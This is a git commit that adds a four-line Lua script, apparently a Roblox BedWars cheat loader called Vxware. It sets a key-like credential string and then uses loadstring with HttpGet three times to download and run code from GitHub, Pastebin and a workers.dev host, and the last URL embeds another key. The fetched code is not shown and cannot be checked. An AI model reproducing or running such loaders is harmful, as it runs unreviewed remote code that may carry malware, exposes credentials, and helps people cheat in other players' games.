c432e361d0925e7e45b21b916a28b2727aa6af8d
vxalware-bedwars-owner <jainasinth@gmail.com>
2025-01-18 11:06:21 +0800

    Create Vxware-Bedwars.lua

---
+++ Vxware-Bedwars.lua
@@ -0,0 +1,4 @@
+getgenv().CAK = "CAK_KZ7DiDSB5-viNcjC-5AKdwKjP0EmqopL" -- This is your key, please dont send it to anybody
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qwertyui-is-back/CatV5/main/init.lua"))()
+loadstring(game:HttpGet('https://pastebin.com/raw/dyuPakFU'))()
+loadstring(game:HttpGet("https://alsploit.bedwars.workers.dev/MainScript.lua?Key=WIp4CY9lcMDbUnJMCre8wn0zzsEh78ZCrLVfgd5YTTmcjek4jA"))()
